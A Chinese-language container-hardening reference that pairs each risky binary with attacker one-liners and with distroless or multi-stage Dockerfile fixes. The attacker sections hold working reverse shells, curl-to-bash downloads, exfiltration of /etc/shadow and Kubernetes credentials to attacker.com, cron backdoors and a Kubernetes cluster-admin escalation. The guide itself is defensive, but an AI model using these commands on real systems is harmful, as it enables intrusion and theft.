# 危险二进制参考手册

容器内危险工具的攻击者用法、检测方法和加固建议。

## 🔴 CRITICAL — 攻击者核心工具

### curl / wget / fetch
**攻击者用法**:
```bash
# 下载 payload
curl http://attacker.com/shell.sh | bash
wget -O - http://attacker.com/reverse.elf | chmod +x; ./reverse.elf

# 反弹 shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
curl http://attacker.com/?output=$(cat /etc/passwd | base64)

# 数据外泄
curl -X POST https://attacker.com/exfil -d @/app/secrets.yaml
curl -F "file=@/etc/kubernetes/admin.conf" http://attacker.com/upload
```

**为何危险**: 下载 → 执行是最直接的后渗透路径，无需编译。

**加固方案**:
```dockerfile
# 多阶段构建，运行时镜像不包含 curl/wget
FROM golang:1.21 AS builder
RUN go build -o /app/server .

FROM gcr.io/distroless/static-debian12  # 无 shell、无网络工具
COPY --from=builder /app/server /app/server
```

---

### nc / netcat / ncat / socat
**攻击者用法**:
```bash
# 经典反弹 shell
nc -e /bin/sh attacker.com 4444
bash -c 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'

# 端口转发（内网穿透）
socat TCP-LISTEN:8080,fork TCP:internal-service:8080

# 数据传输
cat /etc/shadow | nc attacker.com 9999
nc -lvp 9999 > stolen_data.tar.gz  # 接收端
```

**高级变体**: `socat` 功能最强，支持 SSL 加密通道，常用于隐蔽 C2 通信。

---

### python / python3 / perl / ruby / node
**攻击者用法**:
```python
# Python 反弹 shell（最常用）
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# 内网扫描
python3 -c "import socket; [print(i) for i in range(1,255) if not socket.connect_ex(('10.0.0.'+str(i), 22))]"

# 读取环境变量（包含 secrets）
python3 -c "import os,json; print(json.dumps(dict(os.environ)))"
```

```perl
# Perl 一行反弹 shell
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## 🟠 HIGH — 高危辅助工具

### bash / sh / zsh / ash / dash
**攻击者用法**:
```bash
# 交互式 shell 升级
python3 -c "import pty; pty.spawn('/bin/bash')"

# 持久化后门
echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | crontab -
echo "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /etc/profile

# 枚举环境
env | grep -E "KEY|SECRET|PASS|TOKEN|API"
cat /proc/*/environ | tr '\0' '\n' | grep -E "KEY|SECRET"
```

**注意**: `sh` 和 `ash` 在 Alpine 中必须存在（`/bin/sh`），不可完全移除，但应限制 `bash`。

---

### ssh / scp / sftp
**攻击者用法**:
```bash
# 横向移动（使用窃取的 SSH 私钥）
ssh -i /app/.ssh/id_rsa user@192.168.1.100

# 建立 SOCKS 隧道（内网穿透）
ssh -D 1080 user@bastion.internal
proxychains nmap 10.0.0.0/24

# 文件传输
scp -r /data/sensitive user@attacker.com:/exfil/
```

---

### nmap / masscan
**攻击者用法**:
```bash
# 内网侦察
nmap -sn 10.0.0.0/16 -T4         # 主机发现
nmap -sV 10.0.0.100 --open -p-   # 服务指纹
masscan 10.0.0.0/8 -p22,80,443,3306,6379 --rate=10000

# 识别 K8s API
nmap -p 6443,8443,2379 10.0.0.0/24
```

---

### strace / ltrace / gdb
**攻击者用法**:
```bash
# 追踪正在运行的进程，提取内存中的凭证
strace -p $(pgrep app) -e trace=read,write 2>&1 | grep -A1 "AUTH\|password"

# 转储进程内存
gcore -o /tmp/memdump $(pgrep java)
strings /tmp/memdump.* | grep -E "password|secret|key"
```

---

## 🟡 MEDIUM — 中危工具

### gcc / g++ / make / cmake
**攻击者用法**:
```bash
# 编译本地提权 exploit
gcc -o /tmp/exploit exploit.c
./tmp/exploit

# 编译自定义 C2 agent
make -C /tmp/sliver/
```

### git
**攻击者用法**:
```bash
# 克隆攻击工具
git clone https://github.com/carlospolop/PEASS-ng /tmp/tools
git clone https://github.com/bettercap/bettercap /tmp/bc && cd /tmp/bc && make build

# 泄露 git credentials
cat ~/.gitconfig
cat .git/config | grep -A2 "remote"
```

### cloud CLIs (aws / gcloud / az / kubectl)
**攻击者用法**:
```bash
# AWS — 枚举凭证和资源
aws sts get-caller-identity
aws s3 ls --recursive
aws secretsmanager list-secrets
aws iam list-roles

# Kubernetes — 集群控制
kubectl get secrets --all-namespaces
kubectl exec -it another-pod -- /bin/sh
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default

# Docker-in-Docker 逃逸
docker run -v /:/host --privileged alpine chroot /host
```

---

## 最小化原则：Distroless 对比普通镜像

| 工具 | ubuntu:22.04 | alpine:3.18 | distroless |
|------|:-----------:|:-----------:|:----------:|
| bash | ✅ | ❌ (ash) | ❌ |
| curl | ✅ | ❌ | ❌ |
| wget | ✅ | ✅ | ❌ |
| python3 | ✅ | ❌ | ❌ |
| nc | ✅ | ❌ | ❌ |
| gcc | ✅ | ❌ | ❌ |
| ssh | ✅ | ❌ | ❌ |
| apt/apk | ✅ | ✅ | ❌ |

**推荐**: 生产镜像使用 `gcr.io/distroless/*` 或 `scratch`，显著减小攻击面。

---

## Dockerfile 加固示例

```dockerfile
# ✅ 多阶段构建 + Distroless 最小化攻击面
FROM golang:1.21 AS builder
WORKDIR /build
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -ldflags="-w -s" -o /server .

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /server /server
USER nonroot:nonroot
ENTRYPOINT ["/server"]

# 结果: 无 shell、无包管理器、无网络工具、非 root 运行
# 镜像大小: ~10MB vs Ubuntu 的 ~80MB
```
